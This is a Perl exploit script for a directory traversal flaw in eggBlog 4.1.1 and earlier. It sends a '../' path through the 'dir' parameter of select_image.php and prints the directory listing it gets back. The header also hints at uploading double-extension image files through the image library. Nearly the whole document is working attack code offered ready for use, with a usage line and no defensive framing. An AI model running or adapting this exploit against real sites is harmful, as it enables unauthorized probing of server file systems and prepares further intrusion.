eggBlog <= 4.1.1 Local Directory Transversal Exploit
====================================================


#!/usr/bin/perl 
#
# eggBlog <= 4.1.1 Local Directory Transversal Exploit
# 
# by Juri Gianni aka yeat 
#
# Description
# ----------------------------------------------------
# eggBlog contains one flaw that allows an attacker to
# carry out a local directory transversal attack. 
# The issue is due to &#039;select_image.php&#039; script not 
# properly sanitizing user input supplied to the &#039;dir&#039;
# GET variable.
# -----------------------------------------------------
# Note: you may upload image files with double ext on
# _lib/openwysiwyg/addons/imagelibrary/insert_image.php
# -----------------------------------------------------

use LWP::UserAgent;


my $domain = $ARGV[0];
my $folder = $ARGV[1] || &usage;

exploit($folder);


sub usage()
{
      print "eggBlog <= 4.1.1 Local Directory Transversal Exploit\n";
      print "Usage: perl xpl.pl localhost/eggBlog ../../\n";
      exit;
}      


sub exploit()
{
      my $param = shift @_ || die "1 parameter required\n"; 
       
      my $response = undef;
      my @director = undef;
      
      my $lib = new LWP::UserAgent;
      
      $lib->agent(&#039;Lynx (textmode)&#039;);
      $lib->timeout(5);
      
      $response = $lib->get("http://$domain/_lib/openwysiwyg/addons/imagelibrary/select_image.php?dir=$param");
      
      @director = $response->content =~ /<strong>(.+?)<\/strong>/ig;
      
      for (my $i=0;$i<=scalar(@director);$i++) {
         print $director[$i]."\n";
      }   
}      



